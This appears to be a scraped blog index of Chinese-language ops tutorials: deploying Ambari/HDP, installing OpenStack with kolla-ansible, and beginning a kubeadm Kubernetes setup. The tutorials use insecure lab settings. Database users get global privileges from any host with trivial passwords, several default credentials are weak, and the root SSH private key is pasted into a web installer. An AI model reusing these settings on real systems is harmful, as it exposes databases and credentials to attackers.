\u0026#39;hive\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;hive\u0026#39;; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;hive\u0026#39;@\u0026#39;%\u0026#39;; CREATE USER \u0026#39;hive\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;hive\u0026#39;; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;hive\u0026#39;@\u0026#39;localhost\u0026#39;; CREATE USER \u0026#39;hive\u0026#39;@\u0026#39;node001\u0026#39; IDENTIFIED BY \u0026#39;hive\u0026#39;; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;hive\u0026#39;@\u0026#39;node001\u0026#39;; CREATE DATABASE oozie; use oozie; CREATE USER \u0026#39;oozie\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;oozie\u0026#39;; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;oozie\u0026#39;@\u0026#39;%\u0026#39;; CREATE USER \u0026#39;oozie\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;oozie\u0026#39;; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;oozie\u0026#39;@\u0026#39;localhost\u0026#39;; CREATE USER \u0026#39;oozie\u0026#39;@\u0026#39;node001\u0026#39; IDENTIFIED BY \u0026#39;oozie\u0026#39;; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;oozie\u0026#39;@\u0026#39;node001\u0026#39;; FLUSH PRIVILEGES; 4. 安装ambari-agent（所有节点执行） pssh -h /node.list -i \u0026#39;yum -y install ambari-agent\u0026#39; pssh -h /node.list -i \u0026#39;systemctl start ambari-agent\u0026#39; 5. 安装libtirpc-devel（所有节点） pssh -h /node.list -i \u0026#39;yum -y install libtirpc-devel\u0026#39; 6. 启动ambari服务 ambari-server start 部署集群 1. 登录界面 http://192.168.150.106:8080\n默认管理员账户登录， 账户：admin 密码：admin\n2. 选择版本，配置yum源 1）选择Launch Install Wizard 2）配置集群名称 3）选择版本并修改本地源地址\n选HDP-3.1(Default Version Definition); 选Use Local Repository; 选redhat7:\nHDP-3.1：http://node001/HDP/centos7/3.1.5.0-152/ HDP-3.1-GPL: http://node001/HDP-GPL/centos7/3.1.5.0-152/ HDP-UTILS-1.1.0.22: http://node001/HDP-UTILS/centos7/1.1.0.22/\n3. 配置节点和密钥 下载主节点的/root/.ssh/id_rsa，并上传！点击下一步，进入确认主机界面\n也可直接cat /root/.ssh/id_rsa 粘贴即可\n验证通过\n4. 勾选需要安装的服务 由于资源有限，这里并没有选择所有服务\n5. 分配服务master 6. 分配服务slaves 设置相关服务的密码 Grafana Admin: 123456 Hive Database: hive Activity Explorer’s Admin: admin\n7. 连接数据库 8. 编辑配置，默认即可 9. 开始部署 10. 安装成功 右上角两个警告是磁盘使用率警告，虚机分配的磁盘较小\n其他问题（正常情况不需要修改） 1. 添加其他系统支持 HDP默认不支持安装到 isoft-serverosv4.2，需手动添加支持\nvim /usr/lib/ambari-server/lib/ambari_commons/resources/os_family.json 添加如下两行，注意缩进和逗号\n2. YARN Registry DNS 服务启动失败 lsof -i:53 kill -9 3. 设置初始检测的系统版本 vim /etc/ambari-server/conf/ambari.properties server.os_family=redhat7 server.os_type=redhat7 参考 https://blog.csdn.net/qq_36048223/article/details/116113987\n","permalink":"https://www.lvbibir.cn/posts/tech/deploy_ambari_2.7.5_and_hdp_3.1.5/","summary":"前期准备 1. 安装包准备 Ambari2.7.5. HDP3.1.5. libtirpc-devel: 链接：https://pan.baidu.com/s/1eteZ2jGkSq4Pz5YFfHyJgQ 提取码：6hq","title":"部署Ambari 2.7.5 + HDP3.1.5"},{"content":" Sulv\u0026#39;s Blog 一个记录技术、阅读、生活的博客 lvbibir’s Blog life is a fucking movie 👉友链格式 名称： lvbibir’s Blog 网址： https://www.lvbibir.cn 图标： https://image.lvbibir.cn/lvbibir.jpg 描述： life is a fucking movie 👉友链申请要求 秉承互换友链原则、文章定期更新、不能有太多广告、个人描述字数控制在15字内\n","permalink":"https://www.lvbibir.cn/links/","summary":"Sulv\u0026#39;s Blog 一个记录技术、阅读、生活的博客 lvbibir’s Blog life is a fucking movie 👉友链格式 名称： lvbibir’s Blog 网址： https://www.lvbibir.cn 图标： https://image.lvbibir.cn/lvbibir.jpg 描述： life is a fucking movie 👉友链申","title":"🤝友链"},{"content":" 英文名: Acton 职业: 运维工程师 运动: 跑步、steam 博客变更记录\n2022年7月16日 将之前发布在 csdn 的文章迁移过来，将图片外链全部转到了我的七牛云图床\n2022年7月6日 将所有文章的名字改为英文，博客内所有url地址应该全都是英文+下划线的组合了\nurl中带有中文名太长了而且不好看，查了hugo和papermod的文档，没找到特别好的解决方案，只能通过手动改文章的文件名来实现了\n2022年7月4日 hugo站点试运行，域名：https://www.lvbibir.cn\n2021年8月15日 将阿里云轻量服务器自带的wordpress应用改为docker应用，wordpress站点改为全docker部署\n2021年7月13日 wordpress博客站点开始运行，域名：https://lvbibir.cn\n","permalink":"https://www.lvbibir.cn/about/","summary":"英文名: Acton 职业: 运维工程师 运动: 跑步、steam 博客变更记录 2022年7月16日 将之前发布在 csdn 的文章迁移过来，将图片外链全部转到了我的七牛云","title":"🙋🏻‍♂️关于"},{"content":"kolla ansible简介 kolla 的使命是为 openstack 云平台提供生产级别的、开箱即用的交付能力。kolla 的基本思想是一切皆容器，将所有服务基于 Docker 运行，并且保证一个容器只跑一个服务（进程），做到最小粒度的运行 docker。\nkolla 要实现 openetack 部署总体上分为两步，第一步是制作 docker 镜像，第二步是编排部署。因此，kolla 项目又被分为两个小项目：kolla、kolla-ansible 。\nkolla-ansible项目 https://github.com/openstack/kolla-ansible\nkolla项目 https://tarballs.opendev.org/openstack/kolla/\ndockerhub镜像地址 https://hub.docker.com/u/kolla/\n安装环境准备 官方部署文档： https://docs.openstack.org/kolla-ansible/train/user/quickstart.html\n本次部署train版all-in-one单节点，使用一台centos7.8 minimal节点进行部署，该节点同时作为控制节点、计算节点、网络节点和cinder存储节点使用，同时也是kolla ansible的部署节点。\nkolla安装节点要求：\n2 network interfaces 8GB main memory 40GB disk space\n如果是vmware workstation环境，勾选处理器选项的虚拟化引擎相关功能，否则后面需要配置nova_compute_virt_type=qemu参数，这里选择勾选，跳过以下步骤。\ncat /etc/kolla/globals.yml nova_compute_virt_type: \u0026#34;qemu\u0026#34; #或者部署完成后手动调整 [root@kolla ~]# cat /etc/kolla/nova-compute/nova.conf |grep virt_type #virt_type = kvm virt_type = qemu [root@kolla ~]# docker restart nova_compute kolla的安装要求目标机器至少两块网卡，本次安装使用2块网卡对应管理网络和外部网络两个网络平面，在vmware workstation虚拟机新增一块网卡ens34：\nens32，NAT模式，管理网络，正常配置静态IP即可。租户网络与该网络复用，租户vm网络不单独创建网卡 ens34，桥接模式，外部网络，无需配置IP地址，这个其实是让neutron的br-ex 绑定使用，虚拟机通过这块网卡访问外网。\nens34网卡配置参考： https://docs.openstack.org/install-guide/environment-networking-controller.html\ncat \u0026gt; /etc/sysconfig/network-scripts/ifcfg-ens34 \u0026lt;\u0026lt;EOF NAME=ens34 DEVICE=ens34 TYPE=Ethernet ONBOOT=\u0026#34;yes\u0026#34; BOOTPROTO=\u0026#34;none\u0026#34; EOF #重新加载ens34网卡设备 nmcli con reload \u0026amp;\u0026amp; nmcli con up ens34 如果启用cinder还需要额外添加磁盘，这里以添加一块/dev/sdb磁盘为例，创建为物理卷并加入卷组。\npvcreate /dev/sdb vgcreate cinder-volumes /dev/sdb 注意卷组名称为cinder-volumes，默认与后面的globals.yml中定义一致。\n[root@kolla ~]# cat /etc/kolla/globals.yml | grep cinder_volume_group #cinder_volume_group: \u0026#34;cinder-volumes\u0026#34; 部署kolla ansible 配置主机名,kolla预检查时rabbitmq可能需要能够进行主机名解析\nhostnamectl set-hostname kolla 安装依赖\nyum install -y python-devel libffi-devel gcc openssl-devel libselinux-python python2-pip python-pbr epel-release ansible 配置阿里云pip源，否则pip安装时会很慢\nmkdir ~/.pip cat \u0026gt; ~/.pip/pip.conf \u0026lt;\u0026lt; EOF [global] trusted-host=mirrors.aliyun.com index-url=https://mirrors.aliyun.com/pypi/simple/ EOF 安装 kolla-ansible\nkolla版本与openstack版本对应关系：https://releases.openstack.org/teams/kolla.html\npip install setuptools==22.0.5 pip install pip==20.3.4 pip install wheel pip install kolla-ansible==9.1.0 --ignore-installed PyYAML 复制 kolla-ansible配置文件到当前环境\nmkdir -p /etc/kolla chown $USER:$USER /etc/kolla cp -r /usr/share/kolla-ansible/etc_examples/kolla/* /etc/kolla cp /usr/share/kolla-ansible/ansible/inventory/* . 修改ansible配置文件\ncat \u0026lt;\u0026lt; EOF | sed -i \u0026#39;/^\\[defaults\\]$/ r /dev/stdin\u0026#39; /etc/ansible/ansible.cfg host_key_checking=False pipelining=True forks=100 EOF 默认有all-in-one和multinode两个inventory文件，这里使用all-in-one，来规划集群角色，配置默认即可\n[root@kolla ~]# cat all-in-one | more 检查inventory配置是否正确，执行：\nansible -i all-in-one all -m ping 生成openstack组件用到的密码，该操作会填充/etc/kolla/passwords.yml，该文件中默认参数为空。\nkolla-genpwd 修改keystone_admin_password，可以修改为自定义的密码方便后续horizon登录，这里改为kolla。\n$ sed -i \u0026#39;s#keystone_admin_password:.*#keystone_admin_password: kolla#g\u0026#39; /etc/kolla/passwords.yml $ cat /etc/kolla/passwords.yml | grep keystone_admin_password keystone_admin_password: kolla 修改全局配置文件globals.yml，该文件用来控制安装哪些组件，以及如何配置组件，由于全部是注释，这里直接追加进去，也可以逐个找到对应项进行修改。\ncp /etc/kolla/globals.yml{,.bak} cat \u0026gt;\u0026gt; /etc/kolla/globals.yml \u0026lt;\u0026lt;EOF # Kolla options kolla_base_distro: \u0026#34;centos\u0026#34; kolla_install_type: \u0026#34;binary\u0026#34; openstack_release: \u0026#34;train\u0026#34; kolla_internal_vip_address: \u0026#34;192.168.150.155\u0026#34; # Docker options #docker_registry: \u0026#34;registry.cn-beijing.aliyuncs.com\u0026#34; #docker_namespace: \u0026#34;kollaimage\u0026#34; # Neutron - Networking Options network_interface: \u0026#34;ens32\u0026#34; neutron_external_interface: \u0026#34;ens34\u0026#34; neutron_plugin_agent: \u0026#34;openvswitch\u0026#34; enable_neutron_provider_networks: \u0026#34;yes\u0026#34; # OpenStack services enable_cinder: \u0026#34;yes\u0026#34; enable_cinder_backend_lvm: \u0026#34;yes\u0026#34; EOF 参数说明：\nkolla_base_distro: kolla镜像基于不同linux发型版构建，主机使用centos这里对应使用centos类型的docker镜像即可。 kolla_install_type: kolla镜像基于binary二进制和source源码两种类型构建，实际部署使用binary即可。 openstack_release: openstack版本可自定义，会从dockerhub拉取对应版本的镜像 kolla_internal_vip_address: 单节点部署kolla也会启用haproxy和keepalived，方便后续扩容为高可用集群，该地址是ens32网卡网络中的一个可用IP。 docker_registry: 默认从dockerhub拉取镜像，也可以本地搭建仓库，提前推送镜像上去。 docker_namespace: 阿里云kolla镜像仓库所在的命名空间，dockerhub官网默认是kolla。 network_interface: 管理网络的网卡 neutron_external_interface: 外部网络的网卡 neutron_plugin_agent: 默认启用openvswitch enable_neutron_provider_networks: 启用外部网络 enable_cinder: 启用cinder enable_cinder_backend_lvm: 指定cinder后端存储为lvm\n部署openstack组件 部署openstack\n#预配置，安装docker、docker sdk、关闭防火墙、配置时间同步等 kolla-ansible -i ./all-in-one bootstrap-servers #部署前环境检查 kolla-ansible -i ./all-in-one prechecks #拉取镜像，也可省略该步骤，默认会自动拉取 kolla-ansible -i ./all-in-one pull #执行实际部署，拉取镜像，运行对应组件容器 kolla-ansible -i ./all-in-one deploy #生成openrc文件 kolla-ansible post-deploy 以上部署没有报错中断说明部署成功，所有openstack组件以容器方式运行，查看容器\n[root@kolla ~]# docker ps -a 确认没有Exited等异常状态的容器\n[root@kolla ~]# docker ps -a | grep -v Up 本次部署运行了38个容器\n[root@localhost kolla-env]# docker ps -a | wc -l 39 查看拉取的镜像，发现镜像数量与容器数量是一致的。\n[root@kolla ~]# docker images | wc -l 39 [root@kolla ~]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-glance-api train aec757c5908a 2 days ago 1.05GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-keystone-ssh train 2c95619322ed 2 days ago 1.04GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-keystone-fernet train 918564aa9c01 2 days ago 1.04GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-keystone train 8d5f3ca2a73c 2 days ago 1.04GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-cinder-api train 500910236e85 2 days ago 1.19GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-cinder-volume train f76ebe1e133d 2 days ago 1.14GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-cinder-backup train 19342786a92c 2 days ago 1.13GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-cinder-scheduler train 920630f0ea6c 2 days ago 1.11GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-heat-api train 517f6a0643ee 2 days ago 1.07GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-heat-api-cfn train 2d46b91d44ef 2 days ago 1.07GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-heat-engine train ab570c135dbc 2 days ago 1.07GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-horizon train a00ddb359ea5 2 days ago 1.2GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-fluentd train 6a5b7be2551b 2 days ago 697MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-cron train 0f784cd532e2 2 days ago 408MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-chrony train 374dabc62868 2 days ago 408MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-iscsid train 575873f9e4b8 2 days ago 413MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-haproxy train 9cf840548535 2 days ago 433MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-keepalived train b2a20ccd7d6a 2 days ago 414MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-openstack-base train c35001fb182b 3 days ago 920MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-nova-compute train 93be43a73a3e 5 days ago 1.85GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-placement-api train 26f8c88c3c50 5 days ago 1.05GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-nova-api train 2a9d3ea95254 5 days ago 1.08GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-nova-novncproxy train e6acfbe47b2b 5 days ago 1.05GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-nova-conductor train 836a9f775263 5 days ago 1.05GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-nova-ssh train f89a813f3902 5 days ago 1.05GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-nova-scheduler train 8061eaa33d21 5 days ago 1.05GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-openvswitch-vswitchd train 2b780c8075c6 5 days ago 425MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-openvswitch-db-server train 86168147b086 5 days ago 425MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-rabbitmq train 19cd34b4f503 5 days ago 487MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-mariadb train 882472a192b5 6 days ago 593MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-neutron-dhcp-agent train a007b53f0507 7 days ago 1.04GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-neutron-metadata-agent train 8bcff22221bd 7 days ago 1.04GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-nova-libvirt train 539673da5c25 7 days ago 1.25GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-kolla-toolbox train a18a474c65ea 7 days ago 842MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-tgtd train ad5380187ca9 7 days ago 383MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-memcached train 1fcf18645254 7 days ago 408MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-neutron-server train 539cfb7c1fd2 8 days ago 1.08GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-neutron-openvswitch-agent train 95113c0f5b8c 8 days ago 1.08GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-neutron-l3-agent train fbe9385f49ca 8 days ago 1.08GB 查看cinder使用的卷，自动创建了lvm\n[root@kolla ~]# lsblk | grep cinder ├─cinder--volumes-cinder--volumes--pool_tmeta 253:3 0 20M 0 lvm │ └─cinder--volumes-cinder--volumes--pool 253:5 0 19G 0 lvm └─cinder--volumes-cinder--volumes--pool_tdata 253:4 0 19G 0 lvm └─cinder--volumes-cinder--volumes--pool 253:5 0 19G 0 lvm [root@kolla ~]# lvs | grep cinder cinder-volumes-pool cinder-volumes twi-a-tz-- 19.00g 0.00 10.55 另外需要注意，不要在该节点安装libvirt等工具，这些工具安装后可能会启用libvirtd和iscsid.sock等服务，kolla已经在容器中运行了这些服务，这些服务会调用节点上的sock文件，如果节点上也启用这些服务去抢占这些文件，会导致容器异常。默认kolla在预配置时也会主动禁用节点上的相关服务。\n安装OpenStack客户端 可以直接安装到服务器上或者使用docker安装容器\n推荐使用docker容器方式运行客户端\n使用docker容器作为客户端\ndocker run -d --name client \\ --restart always \\ -v /etc/kolla/admin-openrc.sh:/admin-openrc.sh:ro \\ -v /usr/share/kolla-ansible/init-runonce:/init-runonce:rw \\ kolla/centos-binary-openstack-base:train sleep infinity docker exec -it client bash source /admin-openrc.sh openstack service list yum安装openstack客户端\n#启用openstack存储库 yum install -y centos-release-openstack-train #安装openstack客户端 yum install -y python-openstackclient #启用selinux,安装openstack-selinux软件包以自动管理OpenStack服务的安全策略 yum install -y openstack-selinux #报错处理 pip uninstall urllib3 yum install -y python2-urllib3 运行cirros实例 kolla ansible提供了一个快速创建cirros demo实例的脚本/usr/share/kolla-ansible/init-runonce。\n脚本需要cirros镜像，如果网络较慢可以使用浏览器下载放在/opt/cache/files目录下：\nwget https://github.com/cirros-dev/cirros/releases/download/0.4.0/cirros-0.4.0-x86_64-disk.img mkdir -p /opt/cache/files/ mv cirros-0.4.0-x86_64-disk.img /opt/cache/files/ 定义init-runonce示例脚本外部网络配置：\n#定义init-runonce示例脚本外部网络配置 vim /usr/share/kolla-ansible/init-runonce EXT_NET_CIDR=${EXT_NET_CIDR:-\u0026#39;192.168.35/24\u0026#39;} EXT_NET_RANGE=${EXT_NET_RANGE:-\u0026#39;start=192.168.35.150,end=192.168.35.188\u0026#39;} EXT_NET_GATEWAY=${EXT_NET_GATEWAY:-\u0026#39;192.168.35.1\u0026#39;} #执行脚本，上传镜像到glance，创建内部网络、外部网络、flavor、ssh key，并运行一个实例 source /etc/kolla/admin-openrc.sh /usr/share/kolla-ansible/init-runonce 参数说明：\nEXT_NET_CIDR 指定外部网络，由于使用桥接模式，直接桥接到了电脑的无线网卡，所以这里网络就是无线网卡的网段。 EXT_NET_RANGE 指定从外部网络取出一个地址范围，作为外部网络的地址池 EXT_NET_GATEWAY 外部网络网关，这里与wifi网络使用的网关一致\n根据最终提示运行实例\nopenstack server create \\ --image cirros \\ --flavor m1.tiny \\ --key-name mykey \\ --network demo-net \\ demo1 访问openstack horizon 访问openstack horizon需要使用vip地址，节点上可以看到由keepalived容器生成的vip\n[root@kolla ~]# ip a |grep ens32 2: ens32: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 inet 192.168.150.101/24 brd 192.168.150.255 scope global noprefixroute dynamic ens32 inet 192.168.150.155/32 scope global ens32 浏览器直接访问该地址即可登录到horizon\nhttp://192.168.150.155\n我这里的用户名密码为admin/kolla，信息可以从admin-openrc.sh中获取\n[root@kolla ~]# cat /etc/kolla/admin-openrc.sh # Clear any old environment that may conflict. for key in $( set | awk \u0026#39;{FS=\u0026#34;=\u0026#34;} /^OS_/ {print $1}\u0026#39; ); do unset $key ; done export OS_PROJECT_DOMAIN_NAME=Default export OS_USER_DOMAIN_NAME=Default export OS_PROJECT_NAME=admin export OS_TENANT_NAME=admin export OS_USERNAME=admin export OS_PASSWORD=kolla export OS_AUTH_URL=http://192.168.150.155:35357/v3 export OS_INTERFACE=internal export OS_ENDPOINT_TYPE=internalURL export OS_IDENTITY_API_VERSION=3 export OS_REGION_NAME=RegionOne export OS_AUTH_PLUGIN=password 默认登录后如下\n在horizion查看创建的网络和实例\n登录实例控制台，验证实例与外网的连通性，cirros用户密码在初次登录时有提示：\n为实例绑定浮动IP地址，方便从外部ssh远程连接到实例\n点击+随机分配一个浮动IP\n在实例界面可以看到绑定的浮动ip\n在kolla节点上或者在集群外部使用SecureCRT等ssh工具连接到实例。cirros镜像默认用户密码为cirros/gocubsgo，该镜像信息官网有介绍： https://docs.openstack.org/image-guide/obtain-images.html#cirros-test\n[root@kolla ~]# ssh cirros@192.168.35.183 cirros@192.168.35.183\u0026#39;s password: 运行CentOS实例 centos官方维护有相关cloud image，如果不需要进行定制，可以直接下载来运行实例。\n参考：https://docs.openstack.org/image-guide/obtain-images.html\nCentOS官方维护的镜像下载地址： http://cloud.centos.org/centos/7/images/\n也可以使用命令直接下载镜像，但是下载可能较慢，建议下载好在进行上传。以centos7.8为例：\nwget http://cloud.centos.org/centos/7/images/CentOS-7-x86_64-GenericCloud-2003.qcow2c 下载完成后上传镜像到openstack，直接在horizon上传即可。也可以使用命令上传。\n注意：默认该镜像运行的实例只能使用ssh key以centos用户身份登录，如果需要使用root远程ssh连接到实例需要在上传前为镜像配置root免密并开启ssh访问。\n参考：https://blog.csdn.net/networken/article/details/106713658\n另外我们的命令客户端在容器中，所有这里有些不方便，首先要将镜像复制到容器中，然后使用openstack命令上传。\n这里复制到client容器的根目录下。\n[root@kolla ~]# docker cp CentOS-7-x86_64-GenericCloud-2003.qcow2c client:/ [root@kolla ~]# docker exec -it client bash ()[root@f11a103c5ade /]# ()[root@f11a103c5ade /]# source /admin-openrc.sh ()[root@f11a103c5ade /]# ls | grep CentOS CentOS-7-x86_64-GenericCloud-2003.qcow2c 执行以下openstack命令上传镜像\nopenstack image create \u0026#34;CentOS78-image\u0026#34; \\ --file CentOS-7-x86_64-GenericCloud-2003.qcow2c \\ --disk-format qcow2 --container-format bare \\ --public 创建实例\nopenstack server create \\ --image CentOS78-image \\ --flavor m1.small \\ --key-name mykey \\ --network demo-net \\ demo-centos 创建完成后为实例绑定浮动IP。\n如果实例创建失败可以查看相关组件报错日志\n[root@kolla ~]# tail -100f /var/log/kolla/nova/nova-compute.log 如果没有提前定制镜像修改root密码，只能使用centos用户及sshkey登录，由于是在容器中运行的demo示例，ssh私钥也保存在容器的默认目录下，在容器中连接实例浮动IP测试\n[root@kolla ~]# docker exec -it client bash ()[root@b86f87f7f101 ~]# ssh -i /root/.ssh/id_rsa centos@192.168.35.186 Last login: Fri Oct 29 08:10:42 2021 from 192.168.35.188 [centos@demo-centos ~]$ sudo -i [root@demo-centos ~]# 运行Ubuntu实例 下载镜像\nwget https://cloud-images.ubuntu.com/bionic/current/bionic-server-cloudimg-amd64.img docker cp bionic-server-cloudimg-amd64.img client:/ 上传镜像\nopenstack image create \u0026#34;Ubuntu1804\u0026#34; \\ --file bionic-server-cloudimg-amd64.img \\ --disk-format qcow2 --container-format bare \\ --public 创建实例\nopenstack server create \\ --image Ubuntu1804 \\ --flavor m1.small \\ --key-name mykey \\ --network demo-net \\ demo-ubuntu 绑定浮动ip\nubuntu镜像默认用户为ubuntu，首次登陆使用sshkey方式\n调整集群配置 集群部署完成后需要开启新的组件或者扩容，可以修改/etc/kolla/global.yml调整参数。 或者在/etc/kolla/config目录下创建自定义配置文件，例如\n# mkdir -p /etc/kolla/config/nova # vim /etc/kolla/config/nova/nova.conf [DEFAULT] block_device_allocate_retries = 300 block_device_allocate_retries_interval = 3 重新配置openstack，kolla会自动重建配置变动的容器组件。\nkolla-ansible -i all-in-one reconfigure -t nova kolla配置和日志文件 各个组件配置文件目录： /etc/kolla/ 各个组件日志文件目录：/var/log/kolla/ 清理kolla ansilbe集群 kolla-ansible destroy --include-images --yes-i-really-really-mean-it #或者 [root@kolla ~]# cd /usr/share/kolla-ansible/tools/ [root@all tools]# ./cleanup-containers [root@all tools]# ./cleanup-host #重置cinder卷，谨慎操作 vgremove cinder-volumes 重新部署 Kolla ansible 集群 ## 清除操作 先关闭所有运行的实例，再进行下面操作 [root@kolla ~]# cd /usr/share/kolla-ansible/tools/ [root@all tools]# ./cleanup-containers vgremove cinder-volumes ## 重建操作 pvcreate /dev/sdb vgcreate cinder-volumes /dev/sdb kolla-ansible -i ./all-in-one deploy kolla-ansible post-deploy 可能遇到的问题 虚拟ip分配失败 这种情况多半是由于虚拟ip没有分配到，并不是端口问题\n解决方法1 在全局的配置中添加/修改这个id值，必须是0-255之间的数字，并且确保在整个二层网络中是唯一的\nvim /etc/kolla/globals.yml keepalived_virtual_router_id: \u0026#34;199\u0026#34; https://www.bianchengquan.com/article/506138.html\n解决方法2 https://www.nuomiphp.com/serverfault/en/5fff3e4524544316281a16b0.html\n参考 https://blog.csdn.net/networken/article/details/106728002\n","permalink":"https://www.lvbibir.cn/posts/tech/kolla-ansible_deploy_allinone_train/","summary":"kolla ansible简介 kolla 的使命是为 openstack 云平台提供生产级别的、开箱即用的交付能力。kolla 的基本思想是一切皆容器，将所有服务基于 Docker 运行，并且保证","title":"kolla-ansible部署Train版openstack（all-in-one）"},{"content":"Kubernetes 概述 kubernetes 是什么 kubernetes 是 Google 在 2014年开源的一个容器集群管理平台，kubernetes简称 k8s k8s用于容器化应用程序的部署，扩展和管理。 k8s提供了容器的编排，资源调度，弹性伸缩，部署管理，服务发现等一系列功能 kubernetes目标是让部署容器化应用简单高效 Kubernetes 特性 自我修复 在节点故障时重新启动失败的容器，替换和重新部署，保证预期的副本数量；杀死健康检查失败的容器，并且在未准备好之前不会处理客户端请求，确保线上服务不中断。 伸缩性 使用命令、UI或者基于CPU使用情况自动快速扩容和缩容应用程序实例，保证应用业务高峰并发时的高可用性；业务低峰时回收资源，以最小成本运行服务。 自动部署和回滚 K8S采用滚动更新策略更新应用，一次更新一个Pod，而不是同时删除所有Pod，如果更新过程中出现问题，将回滚更改，确保升级不受影响业务。 服务发现和负载均衡 K8S为多个容器提供一个统一访问入口（内部IP地址和一个DNS名称），并且负载均衡关联的所有容器，使得用户无需考虑容器IP问题。 机密和配置管理 管理机密数据和应用程序配置，而不需要把敏感数据暴露在镜像里，提高敏感数据安全性。并可以将一些常用的配置存储在K8S中，方便应用程序使用。 存储编排 挂载外部存储系统，无论是来自本地存储，公有云（如AWS），还是网络存储（如NFS、GlusterFS、Ceph）都作为集群资源的一部分使用，极大提高存储使用灵活性。 批处理 提供一次性任务，定时任务；满足批量数据处理和分析的场景。 Kubeadm 概述 kubeadm是Kubernetes项目自带的及集群构建工具，负责执行构建一个最小化的可用集群以及将其启动等的必要基本步骤，kubeadm是Kubernetes集群全生命周期的管理工具，可用于实现集群的部署、升级、降级及拆除。kubeadm部署Kubernetes集群是将大部分资源以pod的方式运行，例如（kube-proxy、kube-controller-manager、kube-scheduler、kube-apiserver、flannel)都是以pod方式运行。\nKubeadm仅关心如何初始化并启动集群，余下的其他操作，例如安装Kubernetes Dashboard、监控系统、日志系统等必要的附加组件则不在其考虑范围之内，需要管理员自行部署。\nKubeadm集成了Kubeadm init和kubeadm join等工具程序，其中kubeadm init用于集群的快速初始化，其核心功能是部署Master节点的各个组件，而kubeadm join则用于将节点快速加入到指定集群中，它们是创建Kubernetes集群最佳实践的“快速路径”。另外，kubeadm token可于集群构建后管理用于加入集群时使用的认证令牌（token)，而kubeadm reset命令的功能则是删除集群构建过程中生成的文件以重置回初始状态。\nKuberadm 离线部署 k8s 集群 架构图 环境规划 操作系统 IP CPU/MEM 主机名 角色 CentOS 7.7-x86_64 192.168.1.14 2/4G k8s-master Master CentOS 7.7-x86_64 192.168.1.15 2/4G k8s-node1 Work node CentOS 7.7-x86_64 192.168.1.16 2/4G k8s-node2 Work node 【软件包版本号】\nname version Docker 3:19.03.13 kubeadm v1.18.6 kubernetes v1.18.6 安装前提条件 Centos 7.x 最小化安装 时钟同步 下载离线程序包 更新修复，请下载 k8s-kubeadmin.zip 压缩包！！！\n链接：https://pan.baidu.com/s/1Q3jbJcgq0rH8jK-LTpa6Vg 提取码：hhhh\n部署Master节点 执行自动安装脚本 将下载到的程序包拷贝到 k8s-master 节点解压，我这里的master节点是 192.168.1.14\n[root@localhost ~]# ip a | egrep global inet 192.168.1.14/24 brd 192.168.1.255 scope global noprefixroute eth0 [root@localhost ~]# ls anaconda-ks.cfg k8s-kubeadm.tar.gz [root@localhost ~]# tar xf k8s-kubeadm.tar.gz [root@localhost ~]# cd k8s-kubeadm [root@localhost k8s-kubeadm]# ls docker-ce-19.03.12.tar.gz flannel-v0.12.0-linux-amd64.tar.gz install.sh k8s-imagesV1.18.6.tar.gz k8s-V1.18.6.tar.gz kube-flannel.yml packages.tar.gz # 执行脚本 ./install.sh [主机名] [root@localhost k8s-kubeadm]# ./install.sh k8s-master 等待脚本执行自动安装。。。\n执行完毕后，会出现以下提示：\n因为内核进行了升级，请重启服务器。\n重启以后，内核版本更新为 5.8.13\n使用 kubeadm 初始化集群 kubeadm init 